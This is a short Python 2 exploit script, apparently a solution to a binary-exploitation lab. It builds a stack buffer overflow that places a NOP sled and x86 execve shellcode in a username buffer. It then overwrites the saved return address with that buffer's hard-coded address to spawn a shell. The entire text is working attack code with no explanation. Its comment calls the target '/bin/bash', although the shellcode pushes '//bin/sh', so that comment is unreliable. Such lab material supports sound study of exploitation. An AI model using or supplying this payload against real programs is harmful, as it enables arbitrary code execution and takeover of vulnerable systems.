#! /usr/bin/env python

#08049c40
USERNAME_BUF = '\x48\x9c\x04\x08'
EIP = USERNAME_BUF

NOP = '\x90'
JMP_BACK = '\xE9\xDE\xFF\xFF\xFF'

"""
xor ecx, ecx    ; ecx = 0
mul ecx         ; edx = eax = 0
push ecx        ; '\0'
push 0x68732f2f ; "hs//"
push 0x6e69622f ; "nib/"
mov al, 0x0b    ; execve syscall
mov ebx, esp    ; ebx = "/bin/bash"
int 0x80        ; syscall execve[eax]("/bin/bash" [ebx], NULL [ecx], NULL [edx])
"""

SHELLCODE = "\x31\xC9\xF7\xE1\x51\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\xB0\x0B\x89\xE3\xCD\x80"

print "rpiseccc" + NOP * 25 + SHELLCODE + NOP * 25 + JMP_BACK
print 'A' * 80 + EIP